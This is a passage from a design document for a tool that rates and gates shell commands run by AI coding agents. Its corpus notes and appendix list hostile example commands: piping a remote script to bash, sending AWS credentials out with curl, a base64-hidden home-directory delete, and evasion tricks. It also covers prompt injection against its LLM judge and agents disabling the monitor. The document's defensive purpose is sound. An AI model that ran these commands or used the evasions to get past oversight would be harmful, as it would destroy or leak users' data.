- **System prompt:** fixed, describes the effect vocabulary and instructs the model to treat all command text as data.
- **User content:** structured JSON — IR summary, raw command, resolved script excerpts (redacted, truncated to 8 kB), context, agent description.
- **Response schema:**

```json
{
  "effects": [{"kind": "fs.delete", "target": "./dist", "scope": "workspace", "recursive": true}],
  "intent_match": "match | partial | mismatch",
  "explanation": "Deletes the dist folder before rebuilding.",
  "confidence": 0.0
}
```

- Responses failing schema validation are discarded → UNKNOWN.
- The judge's effects go through the same scorer; the result can only raise the static floor.
- `intent_match: mismatch` raises severity by one level and adds reason `llm.intent_mismatch`.

### 12.4 CLI

| Command | Purpose |
| --- | --- |
| `cmdsev hook claude pre\|post` | Hook entry points |
| `cmdsev explain "<cmd>" [--cwd DIR] [--json]` | Analyse a command manually and print IR, effects and reasons |
| `cmdsev daemon [start\|stop\|status]` | Manage the daemon |
| `cmdsev query --json [--session ID] [--since TS]` | History for the VS Code extension and scripts |
| `cmdsev feedback ID --over\|--under [--severity S2]` | Record feedback |
| `cmdsev mine [--path ~/.claude/projects]` | Extract commands from transcripts into the corpus |
| `cmdsev stats` | Coverage, layer mix, latency |
| `cmdsev install claude\|cursor` / `uninstall` | Wire up hooks |
| `cmdsev specs check` | Validate user spec files |

### 12.5 Configuration (`~/.cmdsev/config.toml`)

```toml
[policy]
S0 = "allow"
S1 = "allow"
S2 = "allow"      # plus notification in VS Code
S3 = "ask"
S4 = "deny"
UNKNOWN = "ask"

[llm]
enabled = true
model = "claude-haiku-5-5"
deadline_ms = 800
send_script_contents = true
max_script_bytes = 8192

[context]
prod_markers = ["prod", "production", "live"]

[store]
retention_days = 30
redact_secrets = true

[[override]]
pattern = "git push origin feature/*"
severity = "S2"
note = "Feature branches are fine"
```

Project-level overrides live in `.cmdsev.toml` at the repo root and may only *raise* severity (so a cloned repo can't weaken your policy).

### 12.6 Command spec format (`specs/*.toml`)

```toml
[git]
global_flags = [
  { names = ["-C"], takes_value = true, value_kind = "path" },
  { names = ["-c"], takes_value = true, value_kind = "git_config" },  # core.pager=… → exec
]

[git.sub.push]
effects = ["net.egress", "vcs.remote_write"]
flags = [
  { names = ["-f", "--force", "--force-with-lease"], add = ["vcs.history_rewrite"] },
  { names = ["--delete", "-d"], add = ["vcs.remote_delete"] },
]

[git.sub.status]
effects = ["fs.read"]
safe = true
```

---

## 13. Storage

### 13.1 Entity-relationship diagram

```mermaid
erDiagram
    SESSION ||--o{ COMMAND : contains
    COMMAND ||--o{ EFFECT : has
    COMMAND ||--o{ REASON : explains
    COMMAND ||--o{ FEEDBACK : receives

    SESSION {
        text id PK "agent session_id"
        text agent "claude-code, cursor"
        text title "first user message"
        text cwd
        text transcript_path
        integer started_at
        integer last_seen_at
    }

    COMMAND {
        text id PK "ULID"
        text session_id FK
        text tool_use_id
        text tool "Bash, Write, Edit"
        text command "redacted"
        text description
        text cwd
        integer received_at
        text severity
        text confidence
        text decided_by "L0 to L5"
        text decision "allow, ask, deny"
        text outcome "executed, rejected, unknown"
        integer latency_us
        integer exit_code
        integer duration_ms
        text files_changed "JSON"
        text analyser_version
    }

    EFFECT {
        text command_id FK
        integer idx
        text kind
        text target
        text scope
        integer recursive
        text attrs "JSON"
    }

    REASON {
        text command_id FK
        integer idx
        text rule_id
        integer span_start
        integer span_end
        text text
    }

    FEEDBACK {
        text id PK
        text command_id FK
        text kind "over, under"
        text new_severity
        text note
        integer created_at
    }
```

### 13.2 Schema (DDL)

```sql
PRAGMA journal_mode = WAL;

CREATE TABLE session (
  id TEXT PRIMARY KEY,
  agent TEXT NOT NULL,
  title TEXT,
  cwd TEXT,
  transcript_path TEXT,
  started_at INTEGER NOT NULL,
  last_seen_at INTEGER NOT NULL
);

CREATE TABLE command (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES session(id),
  tool_use_id TEXT,
  tool TEXT NOT NULL,
  command TEXT NOT NULL,
  description TEXT,
  cwd TEXT,
  received_at INTEGER NOT NULL,
  severity TEXT NOT NULL,
  confidence TEXT NOT NULL,
  decided_by TEXT NOT NULL,
  decision TEXT NOT NULL,
  outcome TEXT,
  latency_us INTEGER,
  exit_code INTEGER,
  duration_ms INTEGER,
  files_changed TEXT,
  analyser_version TEXT NOT NULL
);
CREATE INDEX command_session_time ON command(session_id, received_at);
CREATE INDEX command_severity ON command(severity);

CREATE TABLE effect (
  command_id TEXT NOT NULL REFERENCES command(id) ON DELETE CASCADE,
  idx INTEGER NOT NULL,
  kind TEXT NOT NULL,
  target TEXT,
  scope TEXT,
  recursive INTEGER,
  attrs TEXT,
  PRIMARY KEY (command_id, idx)
);

CREATE TABLE reason (
  command_id TEXT NOT NULL REFERENCES command(id) ON DELETE CASCADE,
  idx INTEGER NOT NULL,
  rule_id TEXT NOT NULL,
  span_start INTEGER,
  span_end INTEGER,
  text TEXT NOT NULL,
  PRIMARY KEY (command_id, idx)
);

CREATE TABLE feedback (
  id TEXT PRIMARY KEY,
  command_id TEXT NOT NULL REFERENCES command(id) ON DELETE CASCADE,
  kind TEXT NOT NULL,
  new_severity TEXT,
  note TEXT,
  created_at INTEGER NOT NULL
);
```

Only the daemon writes. When the daemon is down, the hook appends JSON lines to `~/.cmdsev/spool/<date>.jsonl`; the daemon ingests and deletes spool files at start-up.

---

## 14. VS Code extension

### 14.1 Structure

```
vscode/
  package.json          # contributes views, commands, configuration
  src/
    extension.ts        # activate: connect, register views
    daemonClient.ts     # socket client, reconnect with backoff, protocol version check
    historyClient.ts    # spawns `cmdsev query --json`
    sessionTree.ts      # TreeDataProvider: Sessions → Commands
    detailPanel.ts      # Webview: IR, effects, reasons, highlighted span, file changes
    statusBar.ts        # "Agent: 42 cmds · 2 high"
    feedback.ts         # over-rated / under-rated commands
    exportSession.ts    # Markdown audit log
```

**Contributions:** an Activity Bar container `cmdsev` with view `cmdsev.sessions`; commands `cmdsev.refresh`, `cmdsev.filterSeverity`, `cmdsev.openDetail`, `cmdsev.feedbackOver`, `cmdsev.feedbackUnder`, `cmdsev.exportSession`, `cmdsev.explainSelection`; settings `cmdsev.minSeverityNotification` (default S3), `cmdsev.socketPath`, `cmdsev.cliPath`.

### 14.2 Sequence: live tracking and feedback

```mermaid
sequenceDiagram
    autonumber
    actor Dev as Developer
    participant X as VS Code extension
    participant CLI as cmdsev CLI
    participant D as cmdsev daemon
    participant DB as events.db

    X->>D: hello (protocol version)
    D-->>X: server version
    X->>CLI: cmdsev query --json --since last 7 days
    CLI->>DB: SELECT sessions and commands
    DB-->>CLI: rows
    CLI-->>X: JSON history
    X->>X: build session tree
    X->>D: subscribe (all sessions)
    loop each new command event
        D-->>X: event (pre or post)
        X->>X: update tree and status bar
        opt severity at or above notification level
            X->>Dev: notification with severity and reason
        end
    end
    Dev->>X: open command detail
    X->>X: render IR, effects, reasons, highlighted span
    Dev->>X: mark as over-rated
    X->>D: feedback (command_id, over, S1)
    D->>DB: INSERT feedback
    D-->>X: ok
```

### 14.3 UI

| Element | Content |
| --- | --- |
| Session tree | One node per agent session (title, agent, time); children are commands with a severity icon, sorted newest first; filter by min severity; search |
| Detail panel | Command with dangerous span highlighted; effects table; reasons with rule IDs; deciding layer and latency; resolved script excerpts; exit code, duration, files changed |
| Status bar | Commands in active session and count of S3+; click opens the tree |
| Notifications | For severity ≥ `cmdsev.minSeverityNotification` |
| Feedback | Over-rated / under-rated with optional severity and note |
| Export | Session as Markdown audit log |

---

## 15. Rust implementation

### 15.1 Workspace layout

```
cmdsev/
  crates/
    cmdsev-ir        # Core types: CommandIR, Word, Effect, Severity, Verdict
    cmdsev-parse     # tree-sitter-bash + brush-parser → IR, normalise, unwrap
    cmdsev-specs     # Command spec format + compiled spec DB (build.rs)
    cmdsev-effects   # argv matching → effects; pipe/substitution dataflow
    cmdsev-resolve   # package.json, scripts, Makefile, Python/JS scanning
    cmdsev-context   # path scope, git state, kube/aws/db context
    cmdsev-score     # severity combination, policy, explanations
    cmdsev-redact    # secret detection and redaction
    cmdsev-proto     # IPC message types, versioning
    cmdsev-llm       # LLM judge client (deadline, cache, schema validation)
    cmdsev-ml        # features + ONNX model (later)
    cmdsev-store     # SQLite schema, migrations, spool
    cmdsev-daemon    # warm process: caches, LLM, ML, store, event stream
    cmdsev-cli       # binary: hook, explain, query, install, mine, stats
  specs/             # *.toml command specs
  corpus/            # labelled + adversarial test commands
  harness/           # Linux trace harness for ground-truth labels
  vscode/            # TypeScript extension
```

### 15.2 Crate dependency diagram

```mermaid
flowchart BT
    IR["cmdsev-ir"]
    PARSE["cmdsev-parse"] --> IR
    SPECS["cmdsev-specs"] --> IR
    EFF["cmdsev-effects"] --> IR
    EFF --> SPECS
    RES["cmdsev-resolve"] --> PARSE
    RES --> EFF
    CTX["cmdsev-context"] --> IR
    SCORE["cmdsev-score"] --> IR
    RED["cmdsev-redact"]
    PROTO["cmdsev-proto"] --> IR
    LLMC["cmdsev-llm"] --> PROTO
    LLMC --> RED
    ML["cmdsev-ml"] --> IR
    STORE["cmdsev-store"] --> PROTO
    STORE --> RED
    DAEMON["cmdsev-daemon"] --> LLMC
    DAEMON --> ML
    DAEMON --> STORE
    DAEMON --> CTX
    CLI["cmdsev-cli"] --> PARSE
    CLI --> EFF
    CLI --> RES
    CLI --> CTX
    CLI --> SCORE
    CLI --> PROTO
    CLI --> STORE
```

The hook path (`cmdsev-cli` → parse, effects, resolve, context, score) has **no tokio and no network dependency**.

### 15.3 Crates

| Concern | Crate | Notes |
| --- | --- | --- |
| Bash parsing (primary) | `tree-sitter`, `tree-sitter-bash` | Error-tolerant; `ERROR` nodes become `Opaque` |
| Bash parsing (cross-check) | `brush-parser` | Bash-compatible Rust parser with an interpreter |
| Script scanning | `tree-sitter-python`, `-javascript`, `-typescript` | Sink detection |
| Spec DB | `serde`, `toml` at build time; `phf` or `bincode` embedded | No parsing at startup |
| Git context | `gix` or `git2` | In-process index read |
| Hashing, cache | `blake3`, `moka` | Content-hash caches |
| Daemon, IPC | `tokio`, `UnixListener`, JSON lines | Daemon only |
| Store | `rusqlite` (WAL, bundled) | |
| LLM | `reqwest` (rustls), `tokio::time::timeout`, `jsonschema` | |
| ML (later) | `ort` or `tract` | ONNX inference |
| IDs, time | `ulid`, `time` | |
| CLI | `clap` | |
| Errors, logs | `thiserror`, `anyhow`, `tracing` | |
| Testing | `insta`, `proptest`, `cargo-fuzz`, `criterion`, `cargo-nextest` | |

### 15.4 Correctness rules

1. **Pessimistic unknowns.** `Unknown` in program position makes the node `Opaque`. An `Unknown` or `Partial` path in a destructive argument assumes the worst scope: `rm -rf "$DIR/"` is treated as possibly `rm -rf /`.
2. **S0 needs `Confidence::Full`.** Every flag in the spec, every word known or harmless.
3. **Parser disagreement is a signal.** Structural disagreement between tree-sitter and brush makes the command `Opaque`.
4. **Model the real shell.** Detect the shell that will execute (bash vs zsh); zsh-only constructs we can't model become `Opaque`.
5. **Track env effects.** Variables that change which code runs make the command `exec.opaque` or add explicit exec effects.
6. **Never panic to allow.** The hook wraps analysis in `catch_unwind`; any panic or error outputs *ask* with reason `internal.error`.

---

## 16. Coverage strategy

Coverage targets come from the commands agents actually run; command specs are data generated in bulk, then refined by hand.

1. **Mine real usage.** `cmdsev mine` extracts every Bash tool call from Claude Code transcripts (`~/.claude/projects/*/*.jsonl`) and builds a program + subcommand frequency histogram. An estimated 50–80 programs cover 95% of invocations; spec those first.
2. **Generate skeletons.** Convert Fig / Amazon Q autocomplete specs to TOML; they record which flags take values. Misreading a flag value as a positional argument shifts every later argument. Fill gaps from `--help` and man pages.
3. **Annotate effects where it matters.** Skeletons default to `effects = ["unknown"]`, so unannotated parts are never treated as safe.
4. **Walk GTFOBins.** Every listed binary gets explicit `exec` effects on the relevant flags: `find -exec`, `tar --checkpoint-action=exec`, `awk 'BEGIN{system()}'`, `vim -c ':!sh'`, `less` → `!`, `git -c core.pager=`, `ssh -o ProxyCommand=`, `npx`, `pip install`, `npm install`.
5. **Track coverage in CI** as the share of corpus commands with `Confidence::Full`; target ≥ 85%; review the top-unknowns list weekly.

---

## 17. Accuracy and testing

Releases are gated on a labelled corpus that includes adversarial commands, so accuracy is measured rather than assumed.

### 17.1 Corpus sources (`corpus/`)

| Source | Labelling | Purpose |
| --- | --- | --- |
| Real transcripts | LLM-proposed, human-checked | Realistic false-ask rate |
| tldr examples | Automatic, spot-checked | Breadth across thousands of commands |
| Adversarial set | Hand-written + generated | GTFOBins, known agent bypasses, evasions (`r''m`, `$'\x72m'`, `${IFS}`, `\rm`, `command rm`, aliases, `eval`, base64, write-then-exec) |
| Trace-labelled | strace / eBPF (`aya`) in throwaway Linux containers | Per-effect precision and recall against ground truth |

Corpus entry format (`corpus/*.jsonl`):

```json
{"cmd": "rm -rf \"$DIR/\"", "cwd_fixture": "node-repo", "expected_severity": "S4", "expected_effects": ["fs.delete"], "source": "adversarial", "note": "empty DIR expands to /"}
```

### 17.2 Test types

- **Unit tests** per crate (parser cases, argv parsing per spec, scope classification).
- **Snapshot tests (`insta`):** full analysis output for every corpus entry; changes reviewed as diffs.
- **Equivalence tests (`proptest`):** `rm -rf x`, `rm -r -f x`, `rm --recursive --force x`, `\rm -rf x`, `command rm -rf x` must get the same severity.
- **Fuzzing (`cargo-fuzz`):** parser and normaliser never panic, and never output S0 for input containing an `ERROR` node.
- **Comparison against real bash (offline, sandboxed):** normalised word expansion equals what bash prints for `printf '%s\0' <word>`.
- **Fixture workspaces:** small repos (Node, Python, Make, Terraform) with git history for L2/L3 tests.
- **Hook contract tests:** golden stdin/stdout pairs for Claude Code hook JSON.
- **Latency benchmarks (`criterion`, `hyperfine`):** fail CI if static p99 exceeds 20 ms or cold start exceeds 10 ms.

### 17.3 CI release gates

| Metric | Gate |
| --- | --- |
| S4 recall on adversarial set | 100% |
| S3+ recall on all sets | ≥ 99% |
| False-ask rate on real transcripts | ≤ 5% |
| Static coverage (`Confidence::Full`) | ≥ 85%, not falling |
| Static p99 latency | < 20 ms |
| Fuzzing | 30 min per release with no new crashes |

---

## 18. Performance engineering

- **Cold start:** the hook runs once per tool call, so startup dominates. Spec DB compiled into `phf` maps at build time; tree-sitter languages statically linked; no tokio in the hook; target < 10 ms cold start (`hyperfine`).
- **Release profile:** `opt-level = 3`, `lto = "fat"`, `codegen-units = 1`, `panic = "unwind"` (needed for `catch_unwind`); consider `mimalloc`.
- **Git:** read the index once and check tracked status for the specific target paths; avoid full `status` walks on large repos.
- **Caches (daemon):** verdict cache keyed by blake3 of (normalised command, context fingerprint, analyser version); script analysis cache keyed by file content hash; context cache with 2 s TTL.
- **Deadline propagation:** one `Deadline` passed to every layer; the IPC request carries the remaining budget so the daemon never works past it.
- **IPC:** connect timeout 20 ms; one request per connection kept short; responses are small JSON.

---

## 19. Security and privacy of the analyser

| Concern | Measure |
| --- | --- |
| Analyser executing untrusted code | Never runs the analysed command or referenced scripts; only reads files (size-capped) |
| Prompt injection into the LLM judge | Command and script text sent as structured data; judge output schema-validated; can only raise severity |
| Repo weakening user policy | Project `.cmdsev.toml` may only raise severity |
| Secrets in stored commands | `cmdsev-redact` masks tokens, keys, passwords and URLs with credentials before storage and before LLM calls |
| Data sent to LLM | Opt-out via `llm.enabled = false`; `send_script_contents` toggle; open question on hosted vs local model |
| Local socket access | Socket and files created with mode 0600 in `~/.cmdsev/` |
| Retention | `store.retention_days` (default 30); `cmdsev purge` |
| Tampering by the agent | Agent can edit `~/.cmdsev/config.toml` or settings — Write/Edit on these paths is rated S4 |
| Supply chain | Pinned dependencies, `cargo-deny`, `cargo-audit` in CI, signed release artifacts |

---

## 20. Failure modes

| Failure | Behaviour | Result for the user |
| --- | --- | --- |
| Parse error / parser disagreement | `Opaque` → judge if possible | ask (or judged severity) |
| Unknown program | Confidence None → judge | ask (or judged severity) |
| Daemon down | Static only; leftovers UNKNOWN; event spooled | ask for leftovers |
| LLM timeout, error, bad schema | UNKNOWN | ask |
| Hook panic or internal error | `catch_unwind` → ask with `internal.error` | ask |
| Invalid config | Built-in defaults; warning added to reason | default policy |
| Store busy or locked | Retry 3 × 5 ms, then spool | none |
| Hook exceeds agent timeout | Agent applies its own default | depends on agent; keep budget ≤ 1 s |
| Spec file invalid (user) | Skip that file; warning in `cmdsev specs check` | built-in specs only |

---

## 21. Packaging and installation

- **Binaries:** `cargo-dist` builds for macOS arm64/x86_64 and Linux x86_64/arm64; signed and notarised on macOS.
- **Install:** Homebrew tap (`brew install <tap>/cmdsev`) and a shell installer.
- **Agent wiring:** `cmdsev install claude` shows the settings diff, backs up `~/.claude/settings.json`, adds hooks; `cmdsev uninstall claude` reverts.
- **Daemon:** `cmdsev daemon install` writes a launchd agent (macOS) or systemd user unit (Linux).
- **VS Code:** Marketplace extension plus VSIX in releases; checks `protocol` version on `hello` and warns on mismatch.
- **Upgrades:** store migrations run by the daemon at start-up; `analyser_version` recorded per command.

---

## 22. Execution plan

### 22.1 Timeline

Dates assume a start on 2026-11-16, one engineer, upper-bound effort, and phases 4 and 5 in parallel. They are illustrative, not commitments.

```mermaid
gantt
    title cmdsev build plan
    dateFormat YYYY-MM-DD
    axisFormat %d %b

    section Foundations
    P0 Mine transcripts and seed corpus      :p0, 2026-11-16, 7d
    P1 Parse, IR, normalise, fuzzing          :p1, after p0, 14d
    P2 Specs and effects, top 60 programs     :p2, after p1, 21d
    P3 Context, score, hook, store            :p3, after p2, 14d
    MVP gate                                  :milestone, mvp, after p3, 0d

    section Product
    P4 VS Code extension                      :p4, after p3, 14d
    P5 Static resolution                      :p5, after p3, 14d

    section Intelligence
    P6 Daemon and LLM judge                   :p6, after p5, 14d
    P7 Trace harness and classifier           :p7, after p6, 28d
```

### 22.2 Phase details

**Phase 0 — Mine transcripts and seed corpus (~1 week)**

- Tasks: `cmdsev mine` over `~/.claude/projects/*/*.jsonl`; frequency histogram of programs and subcommands; select 300 commands and label them; create fixture workspaces (Node, Python, Make, Terraform).
- Deliverables: `corpus/real.jsonl` (300 labelled), histogram report, top-80 program list.
- Exit criteria: top-80 list covers ≥ 95% of mined invocations.

**Phase 1 — Parse and IR (2 weeks)**

- Tasks: `cmdsev-ir` types; tree-sitter → IR lowering; brush → IR lowering; structural comparison; normaliser (quotes, escapes, `$'…'`, `${IFS}`); wrapper unwrapping and `bash -c` re-parse; zsh construct detection; `cargo-fuzz` target; `cmdsev explain` printing IR.
- Deliverables: `cmdsev-parse` with ≥ 300 unit cases; fuzz target in CI.
- Exit criteria: 1 h fuzz run with no panics; every adversarial evasion in the seed set normalises correctly or becomes `Opaque`.

**Phase 2 — Specs and effects (2–3 weeks)**

- Tasks: spec TOML schema and `build.rs` compiler; Fig spec converter; annotate top ~60 programs; argv parser driven by specs; effect extraction; dataflow taint and combination rules; GTFOBins sweep.
- Deliverables: `specs/` for top programs; `cmdsev-effects`; GTFOBins checklist with each entry covered or marked `Opaque`.
- Exit criteria: static coverage ≥ 70% on seed corpus; 100% S4 recall on GTFOBins-derived cases.

**Phase 3 — Context, score, hook, store (1–2 weeks)**

- Tasks: path canonicalisation and scope; git index reads; cloud context; scoring and policy; reason generation; `cmdsev hook claude pre|post`; `cmdsev install claude`; SQLite schema and spool; redaction.
- Deliverables: working hook in Claude Code; events in `events.db` or spool.
- Exit criteria (**MVP gate**): hook rates Claude Code commands end to end; static p99 < 20 ms; no *allow* on any internal error (tested by fault injection).

**Phase 4 — VS Code extension (2 weeks, parallel with 5)**

- Tasks: history via `cmdsev query --json`; session tree; detail webview; status bar; notifications; feedback; export. Until the daemon exists, poll the CLI every 2 s.
- Deliverables: VSIX.
- Exit criteria: a full Claude Code session appears in the tree within 2 s of each command; feedback rows land in the store.

**Phase 5 — Static resolution (2 weeks, parallel with 4)**

- Tasks: `package.json` scripts with lifecycle hooks; Makefile target parsing; script file parsing; Python/JS/TS sink scans; `npx`/`uvx` detection; content-hash cache.
- Deliverables: `cmdsev-resolve`; fixture tests.
- Exit criteria: write-then-exec cases in the adversarial set rated correctly; static coverage ≥ 85%.

**Phase 6 — Daemon and LLM judge (1–2 weeks)**

- Tasks: daemon with IPC protocol; store writer and event stream; spool ingestion; caches; LLM judge with schema validation, redaction and deadline; intent-mismatch rule; launchd/systemd install; extension switches to live subscribe.
- Deliverables: `cmdsev-daemon`, `cmdsev-llm`.
- Exit criteria: end-to-end p99 < 1 s; LLM outage simulated with no *allow* leaks; false-ask rate ≤ 5% on real transcripts.

**Phase 7 — Trace harness and classifier (3–4 weeks)**

- Tasks: container harness with strace/eBPF; effect extraction from traces; label reconciliation; feature extraction; train gradient-boosted model; ONNX export; daemon integration; feedback ingestion into the corpus.
- Deliverables: `harness/`, `cmdsev-ml`, model artifact.
- Exit criteria: classifier answers ≥ 50% of former LLM calls with no S3+ recall loss; per-effect precision/recall report from traces.

### 22.3 First two weeks (Phase 0 and start of Phase 1)

- [ ] Create Cargo workspace with `cmdsev-ir`, `cmdsev-parse`, `cmdsev-cli` crates and CI (fmt, clippy, nextest)
- [ ] Implement `cmdsev mine` and run it on local transcripts
- [ ] Produce the program frequency histogram and top-80 list
- [ ] Label 300 seed commands into `corpus/real.jsonl`
- [ ] Write 50 adversarial seed cases into `corpus/adversarial.jsonl`
- [ ] Define `CommandIR`, `Word`, `Node`, `Span` types with serde
- [ ] Lower tree-sitter-bash output to IR for simple commands, pipelines and lists
- [ ] Add the `cargo-fuzz` target for the parser
- [ ] `cmdsev explain` prints the IR as JSON

---

## 23. Observability

- `cmdsev stats` and the extension's summary view report, from the local store:
  - static coverage (share decided at L0–L3)
  - layer mix (share decided by each layer)
  - latency p50/p95/p99 per path
  - top unknown programs and flags (feeds spec work)
  - feedback counts (over-/under-rated) per rule ID
- `tracing` logs to `~/.cmdsev/logs/` with rotation; debug level off by default.
- No telemetry leaves the machine. Any future telemetry is opt-in and aggregate only.

---

## 24. Risks and open questions

The biggest risk is a confident wrong S0 verdict; most mitigations exist to prevent that one failure.

| Risk | Mitigation |
| --- | --- |
| Parser differential lets a dangerous command pass as safe | Dual parsing; disagreement → `Opaque`; fuzzing |
| Too many asks, users disable the tool | False-ask gate ≤ 5%; per-user policy; feedback buttons |
| LLM latency or outage | 800 ms deadline; static path never depends on the daemon |
| Prompt injection steers the LLM judge | LLM can only raise severity; input passed as data |
| Specs drift from CLI versions | Regenerate skeletons from Fig specs; unknown flags never treated as safe |
| Multi-step attacks (write, then exec) | Read scripts at hook time; analyse Write/Edit tool calls |
| Agent disables the analyser | Write/Edit to cmdsev config or agent settings rated S4 |
| Hook contract changes in agents | Contract tests per agent version; adapters isolated per agent |

**Open questions**

- [ ] Should S4 default to deny or to a strong ask?
- [ ] Which shell does each target agent actually use to run commands (bash vs zsh vs `$SHELL`)?
- [ ] Is sending commands and script contents to a hosted LLM acceptable, or is a local model required?
- [ ] Which agents beyond Claude Code are in scope for v1?
- [ ] Should approvals given once in a session be remembered for identical commands?

---

## 25. Appendix

### 25.1 Example verdicts

| Command | Context | Expected | Reason |
| --- | --- | --- | --- |
| `git status` | any | S0 allow | `fs.read` only |
| `npm test` | Node repo | S1 allow | resolved script runs `jest`; workspace only |
| `rm -rf node_modules` | untracked, in workspace | S2 allow | recursive delete of regenerable untracked dir (spec marks `node_modules` regenerable) |
| `rm -rf data/` | untracked, in workspace | S3 ask | recursive delete of untracked data, not recoverable |
| `git push --force origin main` | default branch | S4 deny | history rewrite on default branch |
| `git push origin feature/x` | feature branch | S3 ask | remote write |
| `curl -fsSL https://x.sh \| bash` | any | S4 deny | `combo.remote_exec` |
| `cat ~/.aws/credentials \| curl -d @- https://y` | any | S4 deny | `combo.exfil` |
| `rm -rf "$DIR/"` | `DIR` unknown | S4 deny | unknown path in destructive arg assumes `/` |
| `kubectl delete ns app` | context `prod-eu` | S4 deny | `cloud.mutate` on prod |
| `eval "$(echo cm0gLXJmIH4= \| base64 -d)"` | any | S4 deny | `combo.decode_exec` |
| `make clean` | Makefile recipe `rm -rf build` | S2 allow | resolved recipe, workspace untracked build dir |
| `./tools/frob --sync` | unknown script, opaque | UNKNOWN → judged | LLM judge decides; ask on timeout |

### 25.2 Glossary

| Term | Meaning |
| --- | --- |
| IR | Intermediate representation of the parsed command (`CommandIR`) |
| Effect | Typed description of what a command does (`fs.delete`, `net.egress`, …) |
| Opaque | A construct whose behaviour can't be determined statically |
| Confidence | Full / Partial / None — how completely the static layers understood the command |
| Spec | TOML description of a CLI's subcommands, flags and effects |
| Floor | The static severity; ML layers may raise it but never lower it |
| Spool | Fallback JSONL files written by the hook when the daemon is down |
| Gate | A CI threshold a release must meet |
